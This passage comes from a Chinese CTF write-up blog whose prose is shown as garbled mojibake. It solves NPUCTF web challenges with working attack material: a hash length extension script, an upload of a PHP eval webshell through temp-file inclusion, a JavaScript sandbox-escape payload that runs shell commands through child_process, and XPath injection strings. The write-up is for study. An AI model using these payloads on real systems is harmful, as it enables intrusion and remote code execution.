0</span><br><span class="line">X-Xss-Protection: 1; mode&#x3D;block</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Server: WEBrick&#x2F;1.6.0 (Ruby&#x2F;2.7.0&#x2F;2019-12-25)</span><br><span class="line">Date: Sun, 08 Mar 2020 21:40:28 GMT</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.rwx.kr/zer0pts-CTF-2020/#435pts-urlapp" target="_blank" rel="noopener">https://blog.rwx.kr/zer0pts-CTF-2020/#435pts-urlapp</a>æœªå¤ç°æˆåŠŸ</p>
</blockquote>
<p>å‚è€ƒï¼š</p>
<p><a href="https://blog.rwx.kr/zer0pts-CTF-2020/#435pts-urlapp" target="_blank" rel="noopener">https://blog.rwx.kr/zer0pts-CTF-2020/#435pts-urlapp</a></p>
<p><a href="https://www.anquanke.com/post/id/200927#h3-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/200927#h3-4</a></p>
<p><a href="https://gitlab.com/zer0pts/zer0pts-ctf-2020/" target="_blank" rel="noopener">https://gitlab.com/zer0pts/zer0pts-ctf-2020/</a></p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>NPUCTF_WP</title>
    <url>/2020/04/26/NPUCTF-WP/</url>
    <content><![CDATA[<p>è®°å½•å‡ é“NPUCTFæ¯”èµ›WP</p>
<a id="more"></a>

<h1 id="0x01-ezinclude"><a href="#0x01-ezinclude" class="headerlink" title="0x01 ezinclude"></a>0x01 ezinclude</h1><p>é¦–å…ˆè®¿é—®å¯ä»¥å¾—åˆ°</p>
<p><img src="/2020/04/26/NPUCTF-WP/image-20200426095958737.png" alt="image-20200426095958737"></p>
<p>ç„¶åçœ‹åˆ°cookieæœ‰hash</p>
<p><img src="/2020/04/26/NPUCTF-WP/image-20200426101145987.png" alt="image-20200426101145987"></p>
<p>æ„Ÿè§‰è¿™ä¸ªhashå€¼å°±åº”è¯¥æ˜¯$passï¼Œæµ‹è¯•å‘ç°å®ƒå›æ ¹æ®ä¼ å…¥çš„nameå€¼å˜åŒ–ï¼Œç„¶å?name=mount4inï¼Œåhashåˆ·æ–°æˆä¸Šé¢çš„hashå€¼ï¼Œç„¶åå°±å¯ç»•è¿‡ï¼Œ</p>
<p><img src="/2020/04/26/NPUCTF-WP/image-20200426101420611.png" alt="image-20200426101420611"></p>
<p>çœ‹å®˜æ–¹WPè€ƒç‚¹æ˜¯hashæ‰©å±•æ”»å‡»ï¼Œhashæ‰©å±•æ”»å‡»çš„åˆ©ç”¨æ¡ä»¶å°±æ˜¯å¯†é’¥åœ¨å‰é¢ï¼Œå·²çŸ¥ä¸€å¯¹æ˜æ–‡å¯†æ–‡å¯¹ã€‚ç„¶åå¯ä»¥åˆ©ç”¨hashpumpè¿›è¡Œä¼ªé€ å…¶ä»–æ˜æ–‡å¯¹åº”çš„å¯†æ–‡ã€‚è¿™é‡Œæˆ‘ä»¬ä¸çŸ¥é“å¯†é’¥çš„é•¿åº¦ï¼Œæ‰€ä»¥å»çˆ†ç ´å¯†é’¥é•¿åº¦ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://96a4287d-e8a9-469d-bc19-fe91cd56b249.node3.buuoj.cn/index.php?'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>):</span><br><span class="line">    a,b=hashpumpy.hashpump(<span class="string">'5134d395cb21ac79b18b2d7b8d517630'</span>,<span class="string">'admin123'</span>,<span class="string">'1'</span>,i)</span><br><span class="line"></span><br><span class="line">    req=requests.get(url+<span class="string">"name=&#123;&#125;&amp;pass=&#123;&#125;"</span>.format(urllib.parse.quote(b),a))</span><br><span class="line">    <span class="comment">#print(req.text)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'username/password error'</span> <span class="keyword">not</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        print(i)</span><br><span class="line">        print(req.text,url+<span class="string">"name=&#123;&#125;&amp;pass=&#123;&#125;"</span>.format(urllib.parse.quote(b),a))</span><br></pre></td></tr></table></figure>

<p>ç„¶åä¼šè·³è½¬åˆ°flflflflag.phpï¼Œè¿™é‡Œæµè§ˆå™¨ç›´æ¥è®¿é—®ä¼šè·³åˆ°404ç•Œé¢ï¼Œè¿™é‡Œç”¨burpå»è®¿é—®ï¼Œ</p>
<p><img src="/2020/04/26/NPUCTF-WP/image-20200426101637325.png" alt="image-20200426101637325"></p>
<p>æœ‰ä¸€ä¸ªæ–‡ä»¶åŒ…å«ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¼ªåè®®è¯»ä¸‹æºç ï¼Œçœ‹ä¸‹index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line">@$name=$_GET[<span class="string">'name'</span>];</span><br><span class="line">@$pass=$_GET[<span class="string">'pass'</span>];</span><br><span class="line"><span class="keyword">if</span>(md5($secret.$name)===$pass)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;script language="javascript" type="text/javascript"&gt;</span></span><br><span class="line"><span class="string">           window.location.href="flflflflag.php";</span></span><br><span class="line"><span class="string">	&lt;/script&gt;</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	setcookie(<span class="string">"Hash"</span>,md5($secret.$name),time()+<span class="number">3600000</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"username/password error"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>config.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$secret=<span class="string">'%^$&amp;$#fffdflag_is_not_here_ha_ha'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>dir.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(scandir(<span class="string">'/tmp'</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>flflflflag.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=<span class="string">"javascript"</span> type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">           window.location.href=<span class="string">"404.html"</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_Ã¥Â‡ÂºÃ©Â¢Â˜Ã¤ÂºÂº_wants_girlfriend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/data|input|zip/is'</span>,$file))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'nonono'</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>($file);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'include($_GET["file"])'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸ªdir.phpå¯ä»¥æŸ¥çœ‹/tmpç›®å½•çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆåº”è¯¥æ˜¯å¯¹ä¸´æ—¶æ–‡ä»¶çš„åˆ©ç”¨äº†ï¼Œä¹‹å‰æœ‰å¤§ä½¬åˆ†æè¿‡åœ¨ä½¿ç”¨php://filter/string.strip_tags/resource=/etc/passwdè¿™ä¸ªè¿‡æ»¤å™¨æ—¶ï¼Œphpä¼šå‘ç”Ÿé”™è¯¯ï¼Œå¯¼è‡´ä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶ä¸ä¼šè¢«åˆ é™¤ï¼Œä¸€ç›´ä¿å­˜åœ¨/tmpç›®å½•ï¼Œç„¶ååˆ©ç”¨è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">s = requests.session()</span><br><span class="line">proxy = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>,<span class="string">"https"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line">url= <span class="string">'http://96a4287d-e8a9-469d-bc19-fe91cd56b249.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd'</span></span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">	<span class="string">"demo"</span>:(<span class="string">"test.jpg"</span>,<span class="string">"&lt;?php eval($_POST[1]);?&gt;"</span>,<span class="string">"image/jpeg"</span>),</span><br><span class="line">	<span class="string">"submit"</span>:(<span class="literal">None</span>,<span class="string">"submit"</span>)</span><br><span class="line">&#125;</span><br><span class="line">r = s.post(url,proxies=proxy,files=files,allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure>

<p>ä¼ å®Œä¹‹åï¼Œè®¿é—®dir.phpå¯ä»¥å¾—åˆ°ä¸´æ—¶æ–‡ä»¶çš„åï¼Œç„¶ååŒ…å«å°±å¯ä»¥å¾—åˆ°webshellã€‚ç„¶åflagåœ¨phpinfo()é‡Œé¢</p>
<p><img src="/2020/04/26/NPUCTF-WP/image-20200426102656589.png" alt="image-20200426102656589"></p>
<h1 id="0x02-éªŒè¯ğŸ"><a href="#0x02-éªŒè¯ğŸ" class="headerlink" title="0x02 éªŒè¯ğŸ"></a>0x02 éªŒè¯ğŸ</h1><p>å¯ä»¥å¾—åˆ°æºç </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>);</span><br><span class="line"><span class="keyword">const</span> cookieSession = <span class="built_in">require</span>(<span class="string">'cookie-session'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> keys = <span class="built_in">require</span>(<span class="string">'./key.js'</span>).keys;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">md5</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.createHash(<span class="string">'md5'</span>)</span><br><span class="line">    .update(s)</span><br><span class="line">    .digest(<span class="string">'hex'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saferEval</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">''</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125; <span class="comment">// 2020.4/WORKER1 æ·¦ï¼Œä¸Šæ¬¡çš„åº“å¤ªåƒåœ¾ï¼Œæˆ‘è‡ªå·±å†™äº†ä¸€ä¸ª</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = fs.readFileSync(<span class="string">'./index.html'</span>).toString();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">results</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> template.replace(<span class="string">'&#123;&#123;results&#125;&#125;'</span>, results.join(<span class="string">'&lt;br/&gt;'</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">app.use(cookieSession(&#123;</span><br><span class="line">  name: <span class="string">'PHPSESSION'</span>, <span class="comment">// 2020.3/WORKER2 å˜¿å˜¿ï¼Œç»™ğŸ‘´çˆªâ‘§</span></span><br><span class="line">  keys</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Object</span>);</span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Math</span>);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">const</span> results = req.session.results || [];</span><br><span class="line">  <span class="keyword">const</span> &#123; e, first, second &#125; = req.body;</span><br><span class="line">  <span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[<span class="number">0</span>]) === md5(second+keys[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        result = saferEval(req.body.e) || <span class="string">'Wrong Wrong Wrong!!!'</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">        result = <span class="string">'Wrong Wrong Wrong!!!'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      results.unshift(<span class="string">`<span class="subst">$&#123;req.body.e&#125;</span>=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    results.unshift(<span class="string">'Not verified!'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (results.length &gt; <span class="number">13</span>) &#123;</span><br><span class="line">    results.pop();</span><br><span class="line">  &#125;</span><br><span class="line">  req.session.results = results;</span><br><span class="line">  res.send(render(req.session.results));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 è€æ¿å¨˜è¯´å¥¹è¦çœ‹åˆ°æˆ‘ä»¬çš„æºä»£ç ï¼Œç”¨è¡Œæ•°è®¡ç®—KPI</span></span><br><span class="line">app.get(<span class="string">'/source'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">'Content-Type'</span>, <span class="string">'text/javascript;charset=utf-8'</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">'./index.js'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">'Content-Type'</span>, <span class="string">'text/html;charset=utf-8'</span>);</span><br><span class="line">  req.session.admin = req.session.admin || <span class="number">0</span>;</span><br><span class="line">  res.send(render(req.session.results = req.session.results || []))</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">80</span>, <span class="string">'0.0.0.0'</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Start listening'</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°å…³é”®ç‚¹åœ¨</p>
<p><img src="/2020/04/26/NPUCTF-WP/image-20200426103241744.png" alt="image-20200426103241744"></p>
<p>ä»è¾“å…¥ä¸­è·å–eã€firstã€secondï¼Œå¦‚æœé€šè¿‡</p>
<p><code>(first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0]))</code>è¿™ä¸ªæ¡ä»¶è€Œä¸”eå­˜åœ¨å°±è°ƒç”¨saferEval()å¤„ç†ã€‚</p>
<p>é¦–å…ˆè¿™ä¸ªæ¡ä»¶è¦æ±‚firstå’Œsecondé•¿åº¦ç›¸ç­‰ã€firstä¸ç­‰äºsecondã€firstå’Œsecondæ‹¼æ¥ä¸€ä¸ªå€¼åçš„md5ç›¸ç­‰ã€‚è¿™ä¸ªä¹‹å‰æœ‰ä¸ªæ¯”èµ›è€ƒè¿‡ï¼Œå…·ä½“é“¾æ¥æ‰¾ä¸åˆ°äº†ï¼Œå› ä¸ºjsä¹Ÿæ˜¯ä¸€ä¸ªå¼±ç±»å‹çš„è¯­è¨€ï¼Œfirstå’Œsecondåœ¨ä¸keys[0]æ‹¼æ¥æ—¶ä¼šå¼ºåˆ¶è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œè€Œä¸”Stringå’ŒArrayéƒ½æœ‰lengthå±æ€§ã€‚</p>
<img src="/2020/04/26/NPUCTF-WP/image-20200426104545707.png" alt="image-20200426104545707" style="zoom:150%;">

<p>ç„¶åå°±æ˜¯å¯¹saferEval()çš„ç»•è¿‡ï¼Œ</p>
<img src="/2020/04/26/NPUCTF-WP/image-20200426105112573.png" alt="image-20200426105112573" style="zoom:150%;">

<p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªè¿‡æ»¤ä¼šæ›¿æ¢æ­£åˆ™è¡¨è¾¾å¼çš„å†…å®¹ä¸ºç©ºï¼Œè‹¥æ›¿æ¢åä¸ºç©ºï¼Œåˆ™æ‰§è¡Œevalï¼›è‹¥ä¸ä¸ºç©ºè¿”å›nullã€‚åˆ†æä¸‹æ­£åˆ™è¡¨è¾¾å¼</p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">/(?:Math(?:<span class="tag">\<span class="name">.</span></span><span class="tag">\<span class="name">w</span></span>+)?)|[()+<span class="tag">\<span class="name">-</span></span>*/&amp;|^<span class="comment">%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span></span><br><span class="line">(?:Math(?:<span class="tag">\<span class="name">.</span></span><span class="tag">\<span class="name">w</span></span>+)?)</span><br><span class="line">:åŒ¹é…Mathåé¢åŠ å­—æ¯æ•°å­—ä¸‹åˆ’çº¿æˆ–.   å¦‚ï¼šMath.constructoråé¢åªèƒ½0æ¬¡æˆ–1æ¬¡</span><br><span class="line">[()+<span class="tag">\<span class="name">-</span></span>*/&amp;|^<span class="comment">%&lt;&gt;=,?:]</span></span><br><span class="line">:åŒ¹é…()+<span class="tag">\<span class="name">-</span></span>*/&amp;|^<span class="comment">%&lt;&gt;=,?:   è¿™äº›å­—ç¬¦</span></span><br><span class="line">(?:<span class="tag">\<span class="name">d</span></span>+<span class="tag">\<span class="name">.</span></span>?<span class="tag">\<span class="name">d*</span></span>(?:e<span class="tag">\<span class="name">d</span></span>+)?)</span><br><span class="line">:åŒ¹é…æ•°å­—  å¦‚ï¼š122.122</span><br><span class="line">åé¢åº”è¯¥è¿˜æœ‰ä¸€ä¸ªç©ºæ ¼</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥ç”¨åˆ°<code>=&gt;</code>è¿™ä¸ªç¬¦å·ï¼Œæ¥ç”ŸæˆåŒ¿åå‡½æ•°ï¼Œå¹¶ä¸”åœ¨åé¢åŠ ä¸Šå‚æ•°å¯ä»¥ç«‹å³è°ƒç”¨ã€‚</p>
<img src="/2020/04/26/NPUCTF-WP/image-20200426113154558.png" alt="image-20200426113154558" style="zoom:150%;">

<p>è¿™é‡Œå…ˆè´´å‡ºpayloadï¼Œç„¶åå†åˆ†æã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="params">Math</span>=&gt;</span>(<span class="built_in">Math</span>=<span class="built_in">Math</span>.constructor,<span class="built_in">Math</span>.x=<span class="built_in">Math</span>.constructor(<span class="built_in">Math</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>))()))(<span class="built_in">Math</span>+<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>æœ€åä¼ ç»™evalæ‰§è¡Œçš„åº”è¯¥æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼å­—ç¬¦ä¸²ï¼Œå¦‚alert(1)è¿™ç§å½¢å¼ã€‚æ­£åˆ™è¡¨è¾¾å¼åªå…è®¸åœ¨Mathåé¢åŠ å­—æ¯å­—ç¬¦ï¼ŒæŸ¥çœ‹å¯¹åº”çš„Mathçš„å‡½æ•°æ²¡æœ‰èƒ½å¤Ÿå°†æ•°å­—è½¬æ¢æˆå­—æ¯çš„ï¼ˆè¿™é‡Œä¸åƒphpï¼Œphpé‡Œé¢æœ‰å¾ˆå¤šå¯ä»¥å°½å¿ƒè¿›åˆ¶è½¬æ¢çš„å‡½æ•°ï¼‰ï¼Œä½†æ˜¯String.fromCharCode()è¿™ä¸ªå‡½æ•°å¯ä»¥å°†asciiç è½¬æ¢æˆå­—ç¬¦ï¼Œç„¶åå°±é€šè¿‡åŸå‹è·å¾—Stringã€‚</p>
<p><img src="/2020/04/26/NPUCTF-WP/image-20200426120922034.png" alt="image-20200426120922034"></p>
<p>å¦‚ä¸Šå›¾æ‰€ç¤ºæˆ‘ä»¬éœ€è¦è·å¾—Functionå’ŒStringï¼Œ</p>
<img src="/2020/04/26/NPUCTF-WP/image-20200426121147768.png" alt="image-20200426121147768" style="zoom:150%;">

<p>Math+1ä¼šå› ä¸ºObjectä¸å­—ç¬¦ä¸²æ‹¼æ¥ååŸå‹ä¼šå˜æˆStringï¼Œç„¶åStringçš„constructorä¸ºFunctionï¼Œè¿™æ ·å°±å¾—åˆ°äº†éœ€è¦çš„ä¸œè¥¿ï¼Œè¿›è¡Œæ›¿æ¢å°±å¥½ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="params">Math</span>=&gt;</span>(<span class="built_in">Math</span>=<span class="built_in">Function</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>))()))()</span><br><span class="line"></span><br><span class="line">(<span class="built_in">Math</span>+<span class="number">1</span>).constructor				======&gt;&gt;<span class="built_in">String</span></span><br><span class="line">(<span class="built_in">Math</span>+<span class="number">1</span>).constructor.constructor	======&gt;&gt;<span class="built_in">Function</span></span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="params">Math</span>=&gt;</span>(<span class="built_in">Math</span>=<span class="built_in">Math</span>.constructor,<span class="built_in">Math</span>=<span class="built_in">Math</span>.constructor(<span class="built_in">Math</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>))()))(<span class="built_in">Math</span>+<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>ç„¶åæˆ‘ä»¬å°†ä¸‹é¢çš„payloadç¼–ç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(string)</span>:</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        result += str(ord(i))</span><br><span class="line">        result += <span class="string">","</span></span><br><span class="line">    <span class="keyword">return</span> result[<span class="number">0</span>:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"String.fromCharCode("</span>+fun(<span class="string">"return process.mainModule.require('child_process').execSync('cat /flag')"</span>)+<span class="string">")"</span></span><br><span class="line"><span class="comment">#return process.mainModule.require('child_process').execSync('cat /flag')</span></span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"first"</span>:<span class="string">"1"</span>,<span class="attr">"second"</span>:[<span class="number">1</span>],<span class="attr">"e"</span>:<span class="string">"(Math=&gt;(Math=Math.constructor,Math=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)"</span>&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/26/NPUCTF-WP/image-20200426122851092.png" alt="image-20200426122851092"></p>
<h1 id="0x03-ezlogin"><a href="#0x03-ezlogin" class="headerlink" title="0x03 ezlogin"></a>0x03 ezlogin</h1><p>xpathæ³¨å…¥</p>
<blockquote>
<p>æŸ¥è¯¢è¯­å¥ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$query &#x3D; &quot;&#x2F;root&#x2F;accounts&#x2F;user[username&#x2F;text()&#x3D;&#39;&quot;.$name.&quot;&#39; and password&#x2F;text()&#x3D;&#39;&quot;.$pwd.&quot;&#39;]&quot;;</span><br></pre></td></tr></table></figure>

<p>1.ä¸‡èƒ½å¯†ç ï¼Œè¿™ç‚¹å’ŒSQLå¾ˆåƒï¼›åœ¨çŸ¥é“ç”¨æˆ·åçš„æƒ…å†µï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;admin&#39; or &#39;1&#39;&#x3D;&#39;1&amp;pwd&#x3D;fake</span><br></pre></td></tr></table></figure>

<p>åœ¨ä¸çŸ¥é“ç”¨æˆ·åçš„æƒ…å†µï¼Œä½¿ç”¨ä¸¤ä¸ªorç»•è¿‡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;fake&#39; or &#39;1&#39;or&#39;1&amp;pwd&#x3D;fake</span><br></pre></td></tr></table></figure>

<p>2.ä½¿ç”¨<code>|</code>æ“ä½œç¬¦ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;1&#39;]|&#x2F;&#x2F;*|ss[&#39;&amp;pwd&#x3D;fake</span><br></pre></td></tr></table></figure>

<p>å…¶æ‰§è¡Œçš„è¯­å¥ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;root&#x2F;accounts&#x2F;user[username&#x2F;text()&#x3D;&#39;1&#39; ]|&#x2F;&#x2F;*|ss[&#39;&#39; and password&#x2F;text()&#x3D;&#39;1&#39;]</span><br></pre></td></tr></table></figure>

<p>å³å…ˆé—­åˆå‰é¢çš„è¯­å¥ï¼Œä¹‹å<code>//*</code>åˆ—å‡ºæ–‡æ¡£æ‰€æœ‰å…ƒç´ </p>
<p>3.ç›²æ³¨ï¼Œéœ€è¦ä¸€çº§ä¸€çº§çŒœè§£èŠ‚ç‚¹ï¼›çŒœè§£ç¬¬ä¸€çº§èŠ‚ç‚¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;1&#39; or substring(name(&#x2F;*[position()&#x3D;1]),1,1)&#x3D;&#39;r&#39; or &#39;1&#39;&#x3D;&#39;1&amp;pwd&#x3D;fake</span><br></pre></td></tr></table></figure>

<p>çŒœè§£ç¬¬äºŒçº§èŠ‚ç‚¹æ•°é‡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;1&#39; or count(&#x2F;root&#x2F;*)&#x3D;2 or &#39;1&#39;&#x3D;&#39;1&amp;fake</span><br></pre></td></tr></table></figure>

<p>çŒœè§£ç¬¬äºŒçº§èŠ‚ç‚¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;1&#39; or substring(name(&#x2F;root&#x2F;*[position()&#x3D;1]),1,1)&#x3D;&#39;u&#39; or &#39;1&#39;&#x3D;&#39;1&amp;pwd&#x3D;fake</span><br></pre></td></tr></table></figure>

<p>çŒœè§£idä¸º1çš„userèŠ‚ç‚¹ä¸‹çš„usernameå€¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;1&#39; or substring(&#x2F;root&#x2F;users&#x2F;user[id&#x3D;1]&#x2F;username,1,1)&#x3D;&#39;a&#39; or &#39;1&#39;&#x3D;&#39;1&amp;pwd&#x3D;fake</span><br></pre></td></tr></table></figure>
</blockquote>
